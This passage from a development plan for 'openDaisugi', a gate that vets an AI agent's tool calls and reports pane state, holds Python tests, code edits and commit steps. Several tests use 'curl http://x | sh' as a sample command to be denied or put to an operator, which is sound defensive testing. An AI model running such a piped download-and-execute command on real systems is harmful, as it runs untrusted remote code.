"""The floor's Python contracts (master spec §3): PaneStateEvent,
PaneBackend, and the value types every later sub-project (coppice, the
Herdr/tmux backends, the pi/OpenCode adapters) builds on.

Not a layer module — the layer's gate.py and hook.py may not import this
package (spec-01). The reverse (this package depending on opendaisugi's
layer modules, e.g. opendaisugi._state_report) is fine.
"""

from __future__ import annotations

from opendaisugi.floor.backend import Frame, PaneBackend, PaneInfo, PaneRef
from opendaisugi.floor.events import Ask, PaneStateEvent, effective_state, merge

__all__ = [
    "Ask",
    "Frame",
    "PaneBackend",
    "PaneInfo",
    "PaneRef",
    "PaneStateEvent",
    "effective_state",
    "merge",
]
```

- [ ] **Step 4: Run the tests to confirm they pass**

Run: `cd /mnt/tera/working/programming/openDaisugi && uv run --no-sync pytest tests/floor/ -q`
Expected: all tests pass (Task 1's two files plus this task's two files).

- [ ] **Step 5: Lint and commit**

```bash
uv run --no-sync ruff check src/opendaisugi/floor/ tests/floor/
git add src/opendaisugi/floor/__init__.py src/opendaisugi/floor/events.py src/opendaisugi/floor/backend.py tests/floor/test_events.py tests/floor/test_backend.py
git commit -m "feat(floor): PaneStateEvent, Ask, merge(), and the PaneBackend contract (master spec §3.1/§3.2)"
```

---

### Task 3: The gate reports state after every verdict

**Files:**
- Modify: `src/opendaisugi/gate.py` (`_maybe_ask` ≈ line 137, `_log_tree` ≈ line 572 now returns
  the `SessionTree` it opened, new `_report_and_append_state` and `_report_blocked` helpers,
  `gate_and_contract` ≈ lines 685–795 gains a final wrapped report call)
- Modify: `src/opendaisugi/session_tree.py:22` (`ENTRY_TYPES` gains `"state"`; `_NO_MOVE` ≈
  line 25 also gains `"state"` — a state entry must never become the tree's head)
- Modify: `src/opendaisugi/tui_tree.py:41` (`nodes_for_sprig`'s skip tuple gains `"state"`)
- Modify: `tests/test_session_tree.py:157` (`test_entry_types_are_the_spec_set` expected set)
- Test: `tests/test_hook_report_events.py` (new — gate-side tests; task 4 appends hook.py-side
  tests to this same file)

**Interfaces:**
- Consumes: `opendaisugi._state_report.build_event`, `.report_state` (Task 1);
  `opendaisugi.session_tree.SessionTree.open_or_create` (existing).
- Produces: `gate._maybe_ask(root, payload, decision, *, timeout_s, session_id=None, fmt="claude", sleep=time.sleep, clock=time.monotonic) -> GateDecision`
  (the two new keyword-only params are additive — every existing call site in `tests/test_ask.py`
  keeps working unchanged); `gate._log_tree(root, payload, decision, *, session_id, fmt) -> SessionTree | None`
  (now returns the tree it opened, or `None` on any failure/non-dict payload — the return type
  changes from the implicit `None` every existing caller already ignored, so this is additive);
  `gate._report_and_append_state(root, *, session_id, harness, cwd, harness_session_id, transcript_path, state, detail, ask=None, tree=None) -> None`
  (private, used by both new call sites below — `tree`, when given, is reused instead of
  reopening the session tree, S4);
  `gate._maybe_report_state(root, payload, decision, *, session_id, fmt, tree) -> None`.

- [ ] **Step 1: Write the failing tests**

```python
# tests/test_hook_report_events.py
"""The gate reports floor state after every verdict (spec-01, §3.1/§3.6).

Allow/deny both resolve to 'working' — 'blocked' means waiting on a human,
never 'was denied'. An ask in flight is 'blocked' the moment it is posted
(before the wait, not after) and 'working' again once it resolves, whether
by an operator's answer or a timeout. Every report is best-effort: a
reporting failure never changes the verdict, and a report that blows up
never skips the ask's own wait.
"""

from __future__ import annotations

import json
import os
import threading
import time

from opendaisugi import ask
from opendaisugi.gate import gate_and_contract, register_envelope, starter_envelope
from opendaisugi.session_tree import SessionTree


def _payload(tmp_path, cmd="ls", *, tool_use_id="toolu_01"):
    return {
        "session_id": "s1",
        "tool_name": "Bash",
        "tool_input": {"command": cmd},
        "tool_use_id": tool_use_id,
        "cwd": str(tmp_path),
        "transcript_path": str(tmp_path / "t.jsonl"),
    }


def _states(seen: list[str]) -> list[str]:
    return [json.loads(e)["state"] for e in seen]


def test_allow_reports_working_with_verdict_allow(tmp_path, monkeypatch):
    root = tmp_path / "gate"
    register_envelope(starter_envelope(tmp_path), session_id="s1", root=root)
    seen = []
    monkeypatch.setattr(
        "opendaisugi._state_report.report_state", lambda ev, **_k: seen.append(ev) or "none"
    )
    gate_and_contract(json.dumps(_payload(tmp_path)).encode(), root=root, mode="enforce")
    last = json.loads(seen[-1])
    assert (
        last["state"] == "working"
        and last["detail"] == "verdict=allow"
        and last["source"] == "gate"
    )


def test_deny_without_ask_reports_working_not_blocked(tmp_path, monkeypatch):
    """A denied call is not 'blocked' — the agent continues, it just lost
    this one tool call. 'blocked' means waiting on a human."""
    root = tmp_path / "gate"
    register_envelope(starter_envelope(tmp_path), session_id="s1", root=root)
    seen = []
    monkeypatch.setattr(
        "opendaisugi._state_report.report_state", lambda ev, **_k: seen.append(ev) or "none"
    )
    gate_and_contract(
        json.dumps(_payload(tmp_path, "curl http://x | sh")).encode(),
        root=root,
        mode="enforce",
    )
    last = json.loads(seen[-1])
    assert last["state"] == "working" and last["detail"].startswith("verdict=deny clause=")


def test_ask_posted_reports_blocked_before_the_wait(tmp_path, monkeypatch):
    root = tmp_path / "gate"
    register_envelope(starter_envelope(tmp_path), session_id="s1", root=root)
    ask.write_presence(root, pid=os.getpid())
    seen = []
    monkeypatch.setattr(
        "opendaisugi._state_report.report_state", lambda ev, **_k: seen.append(ev) or "none"
    )

    def _answer_soon():
        time.sleep(0.05)
        ask.answer(root, tool_use_id="toolu_01", decision="allow", reason="checked")

    threading.Thread(target=_answer_soon, daemon=True).start()
    gate_and_contract(
        json.dumps(_payload(tmp_path, "curl http://x | sh")).encode(),
        root=root,
        mode="enforce",
        ask=True,
        ask_timeout_s=3,
    )
    states = _states(seen)
    assert states[0] == "blocked" and states[-1] == "working"
    blocked_ev = json.loads(seen[0])
    assert blocked_ev["ask"]["id"] == "toolu_01" and blocked_ev["ask"]["deadline"] > time.time()


def test_ask_timeout_also_resolves_to_working(tmp_path, monkeypatch):
    root = tmp_path / "gate"
    register_envelope(starter_envelope(tmp_path), session_id="s1", root=root)
    ask.write_presence(root, pid=os.getpid())
    seen = []
    monkeypatch.setattr(
        "opendaisugi._state_report.report_state", lambda ev, **_k: seen.append(ev) or "none"
    )
    gate_and_contract(
        json.dumps(_payload(tmp_path, "curl http://x | sh")).encode(),
        root=root,
        mode="enforce",
        ask=True,
        ask_timeout_s=0.05,
    )
    assert _states(seen) == ["blocked", "working"]


def test_report_failure_never_changes_the_verdict(tmp_path, monkeypatch):
    """Patches _report_and_append_state — the actual escape point on this
    path — not report_state, which the implementation already calls from
    inside _report_and_append_state's own try/except; a monkeypatch there
    would never reach the call sites this test is meant to protect."""
    root = tmp_path / "gate"
    register_envelope(starter_envelope(tmp_path), session_id="s1", root=root)

    def _boom(*_a, **_k):
        raise OSError("floor unreachable")

    monkeypatch.setattr("opendaisugi.gate._report_and_append_state", _boom)
    out = gate_and_contract(
        json.dumps(_payload(tmp_path, "curl http://x | sh")).encode(),
        root=root,
        mode="enforce",
    )
    assert out.exit_code == 2 and out.decision.allow is False


def test_blocked_report_failure_still_posts_the_ask_and_waits(tmp_path, monkeypatch):
    """A _report_and_append_state crash between post_ask and wait_answer
    must not skip the wait — the ask must still be answerable by a real
    operator. Patches the whole build/deliver/append helper (the real
    escape point _report_blocked calls), not report_state alone."""
    root = tmp_path / "gate"
    register_envelope(starter_envelope(tmp_path), session_id="s1", root=root)
    ask.write_presence(root, pid=os.getpid())

    def _boom(*_a, **_k):
        raise OSError("floor unreachable")

    monkeypatch.setattr("opendaisugi.gate._report_and_append_state", _boom)

    def _answer_soon():
        time.sleep(0.05)
        ask.answer(root, tool_use_id="toolu_01", decision="allow", reason="fine")

    threading.Thread(target=_answer_soon, daemon=True).start()
    out = gate_and_contract(
        json.dumps(_payload(tmp_path, "curl http://x | sh")).encode(),
        root=root,
        mode="enforce",
        ask=True,
        ask_timeout_s=3,
    )
    assert out.decision.allow and out.decision.ask


def test_report_escape_cannot_flip_a_shadow_would_deny_to_allow(tmp_path, monkeypatch):
    """An escape from _maybe_report_state must land in the try/except
    gate_and_contract wraps its call in, never in the function's own
    mode-selected failure policy — that outer handler would otherwise
    rewrite an ALREADY-FINAL verdict: in shadow mode, turning a real
    would_deny=True record into a fabricated 'gate I/O error' allow."""
    root = tmp_path / "gate"
    register_envelope(starter_envelope(tmp_path), session_id="s1", root=root)

    def _boom(*_a, **_k):
        raise OSError("floor unreachable")

    monkeypatch.setattr("opendaisugi.gate._report_and_append_state", _boom)
    out = gate_and_contract(
        json.dumps(_payload(tmp_path, "curl http://x | sh")).encode(),
        root=root,
        mode="shadow",
    )
    assert out.decision.would_deny is True
    assert "gate I/O error" not in out.decision.reason


def test_state_entries_land_in_the_session_tree(tmp_path, monkeypatch):
    root = tmp_path / "gate"
    register_envelope(starter_envelope(tmp_path), session_id="s1", root=root)
    monkeypatch.setattr("opendaisugi._state_report.report_state", lambda ev, **_k: "none")
    gate_and_contract(json.dumps(_payload(tmp_path)).encode(), root=root, mode="enforce")
    tree = SessionTree.open(tmp_path / "sessions", "s1")
    states = [e for e in tree.entries() if e.type == "state"]
    assert states and states[-1].data["state"] == "working"
    # spec-01 §Tests: "gate allow/deny/ask each emit the right event AFTER
    # the tree write (assert file order)".
    assert [e.type for e in tree.entries()][-3:] == ["tool_call", "verdict", "state"]


def test_state_entries_do_not_move_the_head(tmp_path, monkeypatch):
    """A 'state' entry must not become the tree's head (session_tree's
    _NO_MOVE) — the NEXT tool call has to parent off the previous verdict,
    not off a state node, or the tree screen and rewind logic (tui_tree.py)
    mis-render a state entry as a checkpoint's or a call's parent."""
    root = tmp_path / "gate"
    register_envelope(starter_envelope(tmp_path), session_id="s1", root=root)
    monkeypatch.setattr("opendaisugi._state_report.report_state", lambda ev, **_k: "none")
    gate_and_contract(
        json.dumps(_payload(tmp_path, tool_use_id="tu1")).encode(), root=root, mode="enforce"
    )
    gate_and_contract(
        json.dumps(_payload(tmp_path, tool_use_id="tu2")).encode(), root=root, mode="enforce"
    )
    tree = SessionTree.open(tmp_path / "sessions", "s1")
    entries = tree.entries()
    first_verdict = next(e for e in entries if e.type == "verdict" and e.data["toolUseId"] == "tu1")
    second_call = next(e for e in entries if e.type == "tool_call" and e.data["toolUseId"] == "tu2")
    assert second_call.parent_id == first_verdict.id
```

Also update the existing exact-set test (`ENTRY_TYPES` is about to gain `"state"`):

```python
# tests/test_session_tree.py — replace the body of test_entry_types_are_the_spec_set
def test_entry_types_are_the_spec_set():
    assert ENTRY_TYPES == frozenset(
        {
            "session",
            "prompt",
            "assistant",
            "tool_call",
            "verdict",
            "tool_result",
            "checkpoint",
            "compaction",
            "branch_summary",
            "label",
            "note",
            "head",
            "state",
        }
    )
    assert (
        Entry("prompt", "a1b2c3d4", None, 1.0, {"text": "x"})
        .to_json()
        .startswith('{"type": "prompt"')
    )
```

- [ ] **Step 2: Run the tests to confirm they fail**

Run: `cd /mnt/tera/working/programming/openDaisugi && uv run --no-sync pytest tests/test_hook_report_events.py tests/test_session_tree.py::test_entry_types_are_the_spec_set -q`
Expected: `tests/test_hook_report_events.py` fails with `AttributeError`/`AssertionError` (no
report is ever sent yet, `seen` stays empty); `test_entry_types_are_the_spec_set` fails because
`ENTRY_TYPES` does not yet contain `"state"` (so the test as edited now expects a set the code
does not produce — confirm this by running it against the UNMODIFIED `session_tree.py` before
Step 3).

- [ ] **Step 3: Write the implementation**

Modify `src/opendaisugi/session_tree.py`:

```python
# OLD (line 22)
ENTRY_TYPES = frozenset(
    {
        "session",
        "prompt",
        "assistant",
        "tool_call",
        "verdict",
        "tool_result",
        "checkpoint",
        "compaction",
        "branch_summary",
        "label",
        "note",
        "head",
    }
)
```

```python
# NEW
ENTRY_TYPES = frozenset(
    {
        "session",
        "prompt",
        "assistant",
        "tool_call",
        "verdict",
        "tool_result",
        "checkpoint",
        "compaction",
        "branch_summary",
        "label",
        "note",
        "head",
        "state",
    }
)
```

```python
# OLD (line 25)
_RESERVED = frozenset({"session", "head"})
_NO_MOVE = frozenset({"label", "head", "session"})
```

```python
# NEW
_RESERVED = frozenset({"session", "head"})
# "state" joins _NO_MOVE in the SAME edit as ENTRY_TYPES: a state entry
# must never become the tree's head, or the next tool_call/checkpoint
# mis-parents onto it instead of onto the previous verdict (S3, spec-01).
_NO_MOVE = frozenset({"label", "head", "session", "state"})
```

Modify `src/opendaisugi/tui_tree.py` — `nodes_for_sprig`'s skip tuple (≈ line 41) must skip
`"state"` entries the same way it already skips `"checkpoint"`, or every pair of tool calls
renders a spurious `state: verdict=allow` node in the tree screen:

```python
# OLD
    for e in tree.entries():
        if not e.id or e.type in ("session", "label", "head", "checkpoint"):
            continue
```

```python
# NEW
    for e in tree.entries():
        if not e.id or e.type in ("session", "label", "head", "checkpoint", "state"):
            continue
```

Modify `src/opendaisugi/gate.py`. First, the `_maybe_ask` signature and body (≈ line 137):

```python
# OLD
def _maybe_ask(
    root: Path, payload: dict[str, Any], decision: GateDecision, *, timeout_s: float,
    sleep: Callable[[float], None] = time.sleep, clock: Callable[[], float] = time.monotonic,
) -> GateDecision:
```

```python
# NEW
def _maybe_ask(
    root: Path, payload: dict[str, Any], decision: GateDecision, *, timeout_s: float,
    session_id: str | None = None, fmt: str = "claude",
    sleep: Callable[[float], None] = time.sleep, clock: Callable[[], float] = time.monotonic,
) -> GateDecision:
```

```python
# OLD
    tool_use_id = payload.get("tool_use_id")
    if not tool_use_id or not _ask.operator_present(root):
        return decision
    tid = str(tool_use_id)
    _ask.post_ask(root, tool_use_id=tid, question={
        "sessionId": payload.get("session_id"), "toolName": decision.tool_name,
        "detail": decision.detail, "reason": decision.reason, "clause": decision.clause,
        "counterexample": decision.counterexample, "toolInput": payload.get("tool_input"),
    }, deadline=time.time() + timeout_s)
    reply = _ask.wait_answer(root, tool_use_id=tid, timeout_s=timeout_s, sleep=sleep, clock=clock)
```

```python
# NEW
    tool_use_id = payload.get("tool_use_id")
    if not tool_use_id or not _ask.operator_present(root):
        return decision
    tid = str(tool_use_id)
    deadline = time.time() + timeout_s
    _ask.post_ask(root, tool_use_id=tid, question={
        "sessionId": payload.get("session_id"), "toolName": decision.tool_name,
        "detail": decision.detail, "reason": decision.reason, "clause": decision.clause,
        "counterexample": decision.counterexample, "toolInput": payload.get("tool_input"),
    }, deadline=deadline)
    try:
        _report_blocked(root, payload, decision, session_id=session_id, fmt=fmt,
                        tool_use_id=tid, deadline=deadline)
    except Exception:  # noqa: BLE001 — must never skip wait_answer below
        pass
    # wait_answer starts its OWN clock here, not when `deadline` above was
    # computed — post_ask's file write and _report_blocked's own (bounded)
    # network call both cost real wall-clock time first. Deriving the
    # wait's timeout from the SAME `deadline` (as a remaining duration,
    # measured right before the call) keeps the floor's already-reported
    # ask.deadline consistent with when the operator's window actually
    # closes, instead of advertising a deadline the real wait outlives (S6).
    remaining = max(0.0, deadline - time.time())
    reply = _ask.wait_answer(root, tool_use_id=tid, timeout_s=remaining, sleep=sleep, clock=clock)
```

First, extend `gate.py`'s existing `if TYPE_CHECKING:` block (line 33) so the quoted
annotation below resolves for ruff (F821):

```python
if TYPE_CHECKING:
    import argparse

    from opendaisugi.session_tree import SessionTree
```

Then add three new private functions right after `_maybe_ask` (before `_verify_with_timeout`):

```python
def _report_and_append_state(
    root: Path,
    *,
    session_id: str,
    harness: str,
    cwd: str,
    harness_session_id: str | None,
    transcript_path: str | None,
    state: str,
    detail: str,
    ask: dict[str, Any] | None = None,
    tree: "SessionTree | None" = None,
) -> None:
    """Build one PaneStateEvent, deliver it, and mirror it into the session
    tree — three INDEPENDENT best-effort steps (spec-01): a socket failure
    must not also swallow the purely-local tree write, and neither may
    ever change a verdict.

    Shared by the live 'blocked' report (posted inside _maybe_ask, before
    the wait — there is no already-open tree to reuse there) and the final
    'working' report (posted once gate_and_contract's pipeline is done —
    _log_tree already opened one). ``tree``, when given, is reused instead
    of reopening the session tree file and rescanning it for its head a
    second time on the SAME gate call (S4, spec-01) — SessionTree.append's
    only expensive path (session_tree.py's head()/_compute_head) is a full
    ``path.read_text()``.

    ALL of the exception boundaries below matter: this is called (directly,
    for the blocked report; via _maybe_report_state, for the final report)
    from inside _maybe_ask/gate_and_contract's flow, where an escape must
    never propagate — for the blocked report specifically, it sits between
    post_ask and wait_answer, and an escape there would skip the wait
    entirely, leaving an operator's ask posted but never honored.
    """
    try:
        from opendaisugi._state_report import build_event

        ev_json = build_event(
            session_id=session_id,
            harness=harness,
            state=state,
            source="gate",
            harness_session_id=harness_session_id,
            detail=detail,
            ask=ask,
        )
    except Exception:  # noqa: BLE001 — best-effort by contract
        return
    try:
        from opendaisugi._state_report import report_state

        report_state(ev_json)
    except Exception:  # noqa: BLE001 — best-effort by contract
        pass
    try:
        from opendaisugi.session_tree import SessionTree

        t = tree
        if t is None:
            t = SessionTree.open_or_create(
                root.parent / "sessions",
                session_id=session_id,
                harness=harness,
                cwd=cwd,
                harness_session_id=harness_session_id,
                transcript_path=transcript_path,
            )
        t.append("state", json.loads(ev_json))
    except Exception:  # noqa: BLE001 — best-effort by contract
        pass


def _report_blocked(
    root: Path,
    payload: dict[str, Any],
    decision: GateDecision,
    *,
    session_id: str | None,
    fmt: str,
    tool_use_id: str,
    deadline: float,
) -> None:
    """Live-report 'blocked' the moment an ask is posted to a present
    operator — before the wait, not after. That is the only point this
    state is actually true, and the only point a floor watching gate.sock
    can show a countdown against the ask's deadline.

    The whole body is wrapped, matching _log_tree/_maybe_checkpoint's own
    pattern: this sits BETWEEN post_ask and wait_answer (_maybe_ask), so
    an escape here must never propagate on its own — it would skip
    wait_answer entirely, leaving a posted ask nobody ever waits on.
    _maybe_ask ALSO wraps its call to this function as a second line of
    defense (spec-01).
    """
    try:
        sid = _safe_session_id(session_id or payload.get("session_id"))
        _report_and_append_state(
            root,
            session_id=sid,
            harness=_HARNESS_BY_FMT.get(fmt, fmt),
            cwd=str(payload.get("cwd") or ""),
            harness_session_id=payload.get("session_id"),
            transcript_path=payload.get("transcript_path"),
            state="blocked",
            detail=f"awaiting operator: {decision.reason}"[:200],
            ask={
                "id": tool_use_id,
                "tool": decision.tool_name,
                "summary": decision.detail,
                "deadline": deadline,
            },
        )
    except Exception:  # noqa: BLE001 — best-effort by contract; the wait must still happen
        pass


def _maybe_report_state(
    root: Path,
    payload: dict[str, Any] | None,
    decision: GateDecision,
    *,
    session_id: str | None,
    fmt: str,
    tree: "SessionTree | None",
) -> None:
    """Best-effort: tell whatever floor is listening the call resolved.

    Runs once the verdict, the tree write, and any checkpoint are all final
    (spec-01) — mirrors _log_tree's own placement and contract. Any ask
    this call triggered is already resolved by the time this runs
    (_maybe_ask blocks synchronously), so the state reported here is
    always 'working': allow vs deny shows up in DETAIL, not in floor
    STATE — 'blocked' means waiting on a human, never 'was denied'.

    ``tree`` is the SessionTree `_log_tree` already opened for this same
    call (or `None` if that failed) — passed through so the state entry
    lands in the SAME tree object right after the verdict entry (S4/S5:
    no second file open+scan, and the file order is guaranteed
    tool_call → verdict → state by construction). The whole body is
    wrapped so a failure in this preamble (session-id sanitizing, the
    detail format string, the harness lookup) cannot escape either — its
    call site in gate_and_contract wraps it again, matching the pattern
    _report_blocked/`_maybe_ask` use (B4, spec-01).
    """
    try:
        p = payload or {}
        sid = _safe_session_id(session_id or p.get("session_id"))
        detail = "verdict=allow" if decision.allow else f"verdict=deny clause={decision.clause}"
        _report_and_append_state(
            root,
            session_id=sid,
            harness=_HARNESS_BY_FMT.get(fmt, fmt),
            cwd=str(p.get("cwd") or ""),
            harness_session_id=p.get("session_id"),
            transcript_path=p.get("transcript_path"),
            state="working",
            detail=detail[:200],
            tree=tree,
        )
    except Exception:  # noqa: BLE001 — best-effort by contract
        pass
```

Now `_log_tree` itself gains a return value — it already opens (or creates) the session tree and
appends `tool_call` + `verdict`; S4's fix is to return that same tree so the final report can
append its `state` entry onto it without a second open-and-rescan:

```python
# OLD
def _log_tree(
    root: Path,
    payload: dict[str, Any] | None,
    decision: GateDecision,
    *,
    session_id: str | None,
    fmt: str,
) -> None:
    """Best-effort mirror of the call and its verdict into the session tree.

    The multi-session view reads this. Never raises; a store failure must not
    change a verdict (same contract as ``_log_shadow``).
    """
    if not isinstance(payload, dict):
        return
    try:
        from opendaisugi.session_tree import SessionTree

        sid = _safe_session_id(session_id or payload.get("session_id"))
        tree = SessionTree.open_or_create(
            root.parent / "sessions",
            session_id=sid,
            harness=_HARNESS_BY_FMT.get(fmt, fmt),
            cwd=str(payload.get("cwd") or ""),
            harness_session_id=payload.get("session_id"),
            transcript_path=payload.get("transcript_path"),
        )
        tool_use_id = payload.get("tool_use_id")
        call = tree.append(
            "tool_call",
            {
                "toolUseId": tool_use_id,
                "name": decision.tool_name or payload.get("tool_name"),
                "stepType": decision.step_type,
                "detail": decision.detail,
                "agentId": payload.get("agent_id"),
                "agentType": payload.get("agent_type"),
            },
        )
        tree.append(
            "verdict",
            {
                "toolUseId": tool_use_id,
                "decision": "allow" if decision.allow else "deny",
                "wouldDeny": decision.would_deny,
                "mode": decision.mode,
                "reason": decision.reason,
                "clause": decision.clause,
                "counterexample": decision.counterexample,
                "envelopeId": decision.envelope_id,
                "planId": decision.plan_id,
                "latencyMs": round(decision.elapsed_ms, 3),
                "answeredBy": "operator" if decision.ask else None,
            },
            parent_id=call.id,
        )
    except Exception:  # noqa: BLE001 — logging is best-effort by contract
        pass
```

```python
# NEW
def _log_tree(
    root: Path,
    payload: dict[str, Any] | None,
    decision: GateDecision,
    *,
    session_id: str | None,
    fmt: str,
) -> "SessionTree | None":
    """Best-effort mirror of the call and its verdict into the session tree.

    The multi-session view reads this. Never raises; a store failure must
    not change a verdict (same contract as ``_log_shadow``). Returns the
    ``SessionTree`` it opened on success, ``None`` on any failure or a
    non-dict payload — the caller (``_maybe_report_state``, via
    ``gate_and_contract``) reuses this SAME tree for the final 'working'
    state entry instead of reopening the file and rescanning it for its
    head a second time (S4, spec-01); every prior caller already ignored
    the return value, so this is additive.
    """
    if not isinstance(payload, dict):
        return None
    try:
        from opendaisugi.session_tree import SessionTree

        sid = _safe_session_id(session_id or payload.get("session_id"))
        tree = SessionTree.open_or_create(
            root.parent / "sessions",
            session_id=sid,
            harness=_HARNESS_BY_FMT.get(fmt, fmt),
            cwd=str(payload.get("cwd") or ""),
            harness_session_id=payload.get("session_id"),
            transcript_path=payload.get("transcript_path"),
        )
        tool_use_id = payload.get("tool_use_id")
        call = tree.append(
            "tool_call",
            {
                "toolUseId": tool_use_id,
                "name": decision.tool_name or payload.get("tool_name"),
                "stepType": decision.step_type,
                "detail": decision.detail,
                "agentId": payload.get("agent_id"),
                "agentType": payload.get("agent_type"),
            },
        )
        tree.append(
            "verdict",
            {
                "toolUseId": tool_use_id,
                "decision": "allow" if decision.allow else "deny",
                "wouldDeny": decision.would_deny,
                "mode": decision.mode,
                "reason": decision.reason,
                "clause": decision.clause,
                "counterexample": decision.counterexample,
                "envelopeId": decision.envelope_id,
                "planId": decision.plan_id,
                "latencyMs": round(decision.elapsed_ms, 3),
                "answeredBy": "operator" if decision.ask else None,
            },
            parent_id=call.id,
        )
        return tree
    except Exception:  # noqa: BLE001 — logging is best-effort by contract
        return None
```

Now the call-site edits in `gate_and_contract`. First, pass the new keywords to `_maybe_ask`:

```python
# OLD
            if ask and mode == "enforce" and decision.would_deny and isinstance(payload, dict):
                decision = _maybe_ask(root, payload, decision, timeout_s=ask_timeout_s)
```

```python
# NEW
            if ask and mode == "enforce" and decision.would_deny and isinstance(payload, dict):
                decision = _maybe_ask(root, payload, decision, timeout_s=ask_timeout_s,
                                      session_id=session_id, fmt=fmt)
```

Then capture `_log_tree`'s returned tree and pass it into a WRAPPED final report call, right
before the function's normal-path `return`:

```python
# OLD
        _log_tree(root, payload, decision, session_id=session_id, fmt=fmt)
        if checkpoints and decision.allow and isinstance(payload, dict):
            _maybe_checkpoint(root, payload, session_id=session_id)
        if captures_root is not None and decision.allow and isinstance(payload, dict):
            try:
                from opendaisugi.hook import record_call

                record_call(payload, root=captures_root)
            except Exception:  # noqa: BLE001 — mirroring is best-effort
                pass
        return _outcome(decision, fmt)
    except Exception as exc:  # noqa: BLE001 — mode-selected failure policy
```

```python
# NEW
        tree = _log_tree(root, payload, decision, session_id=session_id, fmt=fmt)
        if checkpoints and decision.allow and isinstance(payload, dict):
            _maybe_checkpoint(root, payload, session_id=session_id)
        if captures_root is not None and decision.allow and isinstance(payload, dict):
            try:
                from opendaisugi.hook import record_call

                record_call(payload, root=captures_root)
            except Exception:  # noqa: BLE001 — mirroring is best-effort
                pass
        try:
            _maybe_report_state(root, payload, decision, session_id=session_id, fmt=fmt, tree=tree)
        except Exception:  # noqa: BLE001 — reporting is best-effort by contract (B4, spec-01)
            pass
        return _outcome(decision, fmt)
    except Exception as exc:  # noqa: BLE001 — mode-selected failure policy
```

- [ ] **Step 4: Run the tests to confirm they pass, and confirm no regression**

Run: `cd /mnt/tera/working/programming/openDaisugi && uv run --no-sync pytest tests/test_hook_report_events.py tests/test_session_tree.py tests/test_ask.py tests/test_gate_tree.py tests/test_gate.py tests/test_gate_resident.py tests/test_tui_tree.py -q`
Expected: all pass. `tests/test_ask.py` passing unchanged (its five `_maybe_ask` call sites never
pass `session_id`/`fmt`) confirms the new keyword-only parameters are additive, not breaking.
`tests/test_tui_tree.py` passing unchanged confirms adding `"state"` to `nodes_for_sprig`'s skip
tuple does not change how any existing entry type renders.

- [ ] **Step 5: Lint and commit**

```bash
uv run --no-sync ruff check src/opendaisugi/gate.py src/opendaisugi/session_tree.py src/opendaisugi/tui_tree.py tests/test_hook_report_events.py tests/test_session_tree.py
git add src/opendaisugi/gate.py src/opendaisugi/session_tree.py src/opendaisugi/tui_tree.py tests/test_hook_report_events.py tests/test_session_tree.py
git commit -m "feat(gate): report floor state after every verdict — blocked while an ask waits, working otherwise"
```

---

### Task 4: `hook.py` reports Stop/Notification lifecycle events; `daisugi hook report` ships

**Files:**
- Modify: `src/opendaisugi/hook.py` (new `record_lifecycle_event`, after `record_and_contract`)
- Modify: `src/opendaisugi/cli.py` (`hook_record_cmd` gains `--event`; new `hook_report_cmd`)
- Modify: `src/opendaisugi/gate_server.py` (`_Handler.handle` dispatches `hook report` argv)
- Modify: `tests/test_hook_report_events.py` (append hook.py-side tests, task 3 created this file)
- Modify: `tests/test_gate_resident.py` (append the `hook report` socket-dispatch tests)

**Interfaces:**
- Consumes: `opendaisugi._state_report.build_event`, `.report_state`, `.hook_report_argv`
  (Task 1); `opendaisugi.hook._safe_session_id`, `.stdout_for_format` (existing);
  `opendaisugi.gate._HARNESS_BY_FMT` (existing, function-local import — see the note in the
  implementation below on why it is not a top-level import).
- Produces:
  `hook.record_lifecycle_event(raw: bytes, *, event: str, fmt: str = "claude", sessions_root: Path | None = None) -> str`
  (never raises; returns the same host allow-contract string as `record_and_contract`).

- [ ] **Step 1: Write the failing tests**

Append to `tests/test_hook_report_events.py` (the file Task 3 created):

```python
# --- hook.py: Stop and Notification lifecycle events -----------------------


from opendaisugi.hook import record_lifecycle_event


def test_stop_event_reports_idle(tmp_path, monkeypatch):
    seen = []
    monkeypatch.setattr(
        "opendaisugi._state_report.report_state",
        lambda ev, **_k: seen.append(json.loads(ev)) or "none",
    )
    payload = json.dumps(
        {"session_id": "s1", "cwd": str(tmp_path), "transcript_path": str(tmp_path / "t.jsonl")}
    ).encode()
    out = record_lifecycle_event(
        payload, event="stop", fmt="claude", sessions_root=tmp_path / "sessions"
    )
    assert json.loads(out) == {"continue": True}
    assert seen[-1]["state"] == "idle" and seen[-1]["harness"] == "claude-code"


def test_notification_with_explicit_type_is_blocked(tmp_path, monkeypatch):
    seen = []
    monkeypatch.setattr(
        "opendaisugi._state_report.report_state",
        lambda ev, **_k: seen.append(json.loads(ev)) or "none",
    )
    payload = json.dumps(
        {
            "session_id": "s1",
            "notification_type": "permission_prompt",
            "message": "Claude needs your permission to use Bash",
        }
    ).encode()
    record_lifecycle_event(
        payload, event="notification", fmt="claude", sessions_root=tmp_path / "sessions"
    )
    assert seen[-1]["state"] == "blocked"
    assert seen[-1]["ask"]["tool"] == "permission_prompt"


def test_notification_without_type_infers_permission_from_message(tmp_path, monkeypatch):
    """notification_type absent: the message-text fallback must still
    catch a real permission prompt."""
    seen = []
    monkeypatch.setattr(
        "opendaisugi._state_report.report_state",
        lambda ev, **_k: seen.append(json.loads(ev)) or "none",
    )
    payload = json.dumps(
        {
            "session_id": "s1",
            "message": "Claude needs your permission to use Write",
        }
    ).encode()
    record_lifecycle_event(
        payload, event="notification", fmt="claude", sessions_root=tmp_path / "sessions"
    )
    assert seen[-1]["state"] == "blocked"


def test_notification_idle_prompt_is_idle_not_blocked(tmp_path, monkeypatch):
    """idle_prompt is one of the twelve documented notification_type
    values, present alongside a real message — not the message-only
    fallback case. The ORIGINAL bug (`bool(notification_type)` meant
    blocked) would have reported this one blocked; the enum-based fix
    (master spec §3.6: never dress up idle as blocked) must not."""
    seen = []
    monkeypatch.setattr(
        "opendaisugi._state_report.report_state",
        lambda ev, **_k: seen.append(json.loads(ev)) or "none",
    )
    payload = json.dumps(
        {
            "session_id": "s1",
            "notification_type": "idle_prompt",
            "message": "Claude is waiting for your input",
        }
    ).encode()
    record_lifecycle_event(
        payload, event="notification", fmt="claude", sessions_root=tmp_path / "sessions"
    )
    assert seen[-1]["state"] == "idle"


def test_notification_agent_completed_is_idle_not_blocked(tmp_path, monkeypatch):
    """agent_completed is another of the twelve documented values that is
    NOT a request for a human — the enum, not `bool(notification_type)`,
    must be what decides."""
    seen = []
    monkeypatch.setattr(
        "opendaisugi._state_report.report_state",
        lambda ev, **_k: seen.append(json.loads(ev)) or "none",
    )
    payload = json.dumps(
        {
            "session_id": "s1",
            "notification_type": "agent_completed",
            "message": "Turn finished",
        }
    ).encode()
    record_lifecycle_event(
